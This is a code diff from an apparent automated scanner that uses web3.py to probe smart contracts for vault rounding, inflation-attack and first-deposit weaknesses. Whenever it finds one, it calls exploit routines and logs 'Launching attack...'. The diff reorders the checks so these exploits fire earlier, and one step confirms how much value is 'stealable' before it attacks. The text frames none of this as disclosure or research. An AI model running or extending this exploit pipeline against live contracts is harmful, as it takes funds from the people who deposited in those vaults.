@@ -196,6 +196,7 @@ def process_contract(w3: Web3, addr: str) -> None:
 
             # Step 2: Medium - Multiple detection methods
             findings = []
+            rounding_result = {}
             
             # Resolve proxy implementation if applicable
             target_addr_for_bytecode = addr
@@ -239,6 +240,60 @@ def process_contract(w3: Web3, addr: str) -> None:
                     pass
             
             if not ONLY_FOT_MODE:
+                # Share-asset conversion detection (MOVED TO TOP FOR PRIORITY)
+                conversion = detect_share_asset_conversion(w3, addr)
+                if conversion.get("is_vault_like") and (conversion.get("rounding_detected") or conversion.get("inflation_attack_risk")):
+                    findings.append({
+                        "type": "share_asset_conversion",
+                        "data": conversion
+                    })
+                    if conversion.get("rounding_detected") or conversion.get("inflation_attack_risk"):
+                        print(f"[FOUND] Vault Rounding/Inflation Risk in {addr}!", flush=True)
+                        execute_cautious_exploit(w3, addr, "vault_rounding_dust", conversion)
+
+                    if conversion.get("inflation_attack_risk"):
+                        print(f"[PANIC] Inflation attack vulnerability detected for {addr}! Verifying...", flush=True)
+                        try:
+                            poc_res = run_autopoc(addr, {"is_vault_like": True, "findings": findings})
+                            if poc_res.get("is_exploit"):
+                                 print(f"[SUCCESS] Inflation attack confirmed! Stealable: {poc_res.get('stealable_wei')}", flush=True)
+                                 findings.append({
+                                     "type": "confirmed_inflation_attack",
+                                     "data": poc_res
+                                 })
+                                 execute_cautious_exploit(w3, addr, "confirmed_inflation_attack", poc_res)
+                            else:
+                                 print(f"[INFO] Inflation attack verification failed or inconclusive.", flush=True)
+                        except Exception as e:
+                            print(f"[ERROR] Inflation attack verification failed: {e}", flush=True)
+
+                    # First-deposit risk detection
+                    try:
+                        abi_fd = [
+                            {"inputs": [], "name": "totalSupply", "outputs": [{"type":"uint256"}], "stateMutability":"view", "type":"function"}
+                        ]
+                        c_fd = w3.eth.contract(address=addr, abi=abi_fd)
+                        ts = c_fd.functions.totalSupply().call()
+                        if ts == 0:
+                            findings.append({
+                                "type": "first_deposit_risk",
+                                "data": {"total_supply": 0}
+                            })
+                            print(f"[FOUND] First Deposit Risk (TotalSupply=0) in {addr}! Launching attack...", flush=True)
+                            execute_cautious_exploit(w3, addr, "first_deposit_risk", {"total_supply": 0})
+                    except Exception:
+                        pass
+                
+                # Rounding/Dust detection (MOVED TO TOP)
+                rounding_result = detect_rounding(w3, addr)
+                if rounding_result:
+                    findings.append({
+                        "type": "rounding_dust",
+                        "data": rounding_result
+                    })
+                    print(f"[FOUND] Rounding Dust vulnerability in {addr}! Details: {rounding_result}", flush=True)
+                    execute_cautious_exploit(w3, addr, "rounding_dust", rounding_result)
+
                 balance_delta = detect_balance_delta(w3, addr)
                 if balance_delta.get("has_delta"):
                     findings.append({
@@ -432,50 +487,6 @@ def process_contract(w3: Web3, addr: str) -> None:
                     pass
             
             if not ONLY_FOT_MODE:
-                # Share-asset conversion detection
-                conversion = detect_share_asset_conversion(w3, addr)
-                if conversion.get("is_vault_like") and (conversion.get("rounding_detected") or conversion.get("inflation_attack_risk")):
-                    findings.append({
-                        "type": "share_asset_conversion",
-                        "data": conversion
-                    })
-                    if conversion.get("rounding_detected") or conversion.get("inflation_attack_risk"):
-                        print(f"[FOUND] Vault Rounding/Inflation Risk in {addr}!", flush=True)
-                        execute_cautious_exploit(w3, addr, "vault_rounding_dust", conversion)
-
-                    if conversion.get("inflation_attack_risk"):
-                        print(f"[PANIC] Inflation attack vulnerability detected for {addr}! Verifying...", flush=True)
-                        try:
-                            poc_res = run_autopoc(addr, {"is_vault_like": True, "findings": findings})
-                            if poc_res.get("is_exploit"):
-                                 print(f"[SUCCESS] Inflation attack confirmed! Stealable: {poc_res.get('stealable_wei')}", flush=True)
-                                 findings.append({
-                                     "type": "confirmed_inflation_attack",
-                                     "data": poc_res
-                                 })
-                                 execute_cautious_exploit(w3, addr, "confirmed_inflation_attack", poc_res)
-                            else:
-                                 print(f"[INFO] Inflation attack verification failed or inconclusive.", flush=True)
-                        except Exception as e:
-                            print(f"[ERROR] Inflation attack verification failed: {e}", flush=True)
-
-                    # First-deposit risk detection
-                    try:
-                        abi_fd = [
-                            {"inputs": [], "name": "totalSupply", "outputs": [{"type":"uint256"}], "stateMutability":"view", "type":"function"}
-                        ]
-                        c_fd = w3.eth.contract(address=addr, abi=abi_fd)
-                        ts = c_fd.functions.totalSupply().call()
-                        if ts == 0:
-                            findings.append({
-                                "type": "first_deposit_risk",
-                                "data": {"total_supply": 0}
-                            })
-                            print(f"[FOUND] First Deposit Risk (TotalSupply=0) in {addr}! Launching attack...", flush=True)
-                            execute_cautious_exploit(w3, addr, "first_deposit_risk", {"total_supply": 0})
-                    except Exception:
-                        pass
-                
                 # Fee/precision detection
                 fee_precision = detect_fee_precision_math(w3, addr)
                 if fee_precision.get("potential_rounding"):
@@ -513,9 +524,6 @@ def process_contract(w3: Web3, addr: str) -> None:
                     if impl_addr:
                         logger.info(f"Proxy detected, analyzing implementation: {impl_addr}")
                         # Could recursively analyze implementation
-            
-            # Step 3: Rounding detection
-            rounding_result = detect_rounding(w3, addr) if not ONLY_FOT_MODE else {}
             
             # Precompute impact/tvl for fast-path FoT when ONLY_FOT_MODE
             real_impact = calculate_real_impact(w3, addr, {"profit": 0, "gas_used": 0})
